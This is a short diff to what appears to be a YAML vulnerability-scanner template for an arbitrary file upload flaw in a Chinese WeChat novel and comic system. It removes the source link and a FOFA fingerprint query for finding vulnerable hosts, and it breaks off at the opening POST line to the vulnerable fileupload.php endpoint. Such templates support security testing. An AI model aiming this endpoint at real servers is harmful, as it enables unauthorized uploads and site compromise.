@@ -3,12 +3,8 @@ info:
   name: 微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/awmpc25uv3l8aarl'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: awmpc25uv3l8aarl
-    fofa: body="/Public/home/mhjs/jquery.js"
 http:
 - raw:
   - 'POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
